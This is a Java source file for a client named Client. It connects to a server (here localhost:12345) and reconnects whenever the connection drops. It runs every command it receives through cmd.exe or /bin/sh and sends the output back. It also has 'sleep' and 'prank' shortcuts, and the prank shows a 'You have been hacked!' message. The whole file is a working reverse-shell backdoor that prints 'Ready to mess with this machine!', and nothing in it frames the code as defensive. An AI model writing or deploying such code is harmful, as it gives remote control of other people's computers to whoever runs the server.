import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;

public class Client {
    public static void main(String[] args) {
        String hostname = "localhost";
        int port = 12345;

        while(true){
            try(Socket socket = new Socket(hostname, port)){
                System.out.println("Ready to mess with this machine!");

                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                PrintWriter out = new PrintWriter(new OutputStreamWriter(socket.getOutputStream()), true);

                String command;
                while (true) {

                    command = in.readLine();
                    if (command == null || command.equalsIgnoreCase("exit")) {
                        break;
                    }

                    String os = System.getProperty("os.name").toLowerCase();

                    Process process;
                    if(os.contains("win")){
                        if(command.equalsIgnoreCase("sleep")){
                            command = "rundll32.exe powrprof.dll,SetSuspendState Sleep";
                        }else if(command.equalsIgnoreCase("prank")){
                            //command = "prank.bat";
                            command = "echo Running prank";
                            new Prank("You have been hacked!");
                        }
                        System.out.println("Executing command: " + command);
                        process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", command});    
                    }else {
                        if(command.equalsIgnoreCase("sleep")){
                            command = "systemctl suspend";
                        }else if(command.equalsIgnoreCase("prank")){
                            command = "echo \"prank\" is not available on linux";
                        }
                        System.out.println("Executing command: " + command);
                        process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command});
                    }

                    BufferedReader commandOutput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    
                    String line;
                    while((line = commandOutput.readLine()) != null){
                        out.println(line);
                    }

                    process.waitFor();

                    out.println("END");
                }
            }catch(IOException | InterruptedException e){
                System.out.println("Unable to connect to server, Retrying...");
                try{
                    Thread.sleep(2000);
                }catch(InterruptedException ie){
                    System.out.println(ie.getMessage());
                }
            }
        }
    }
}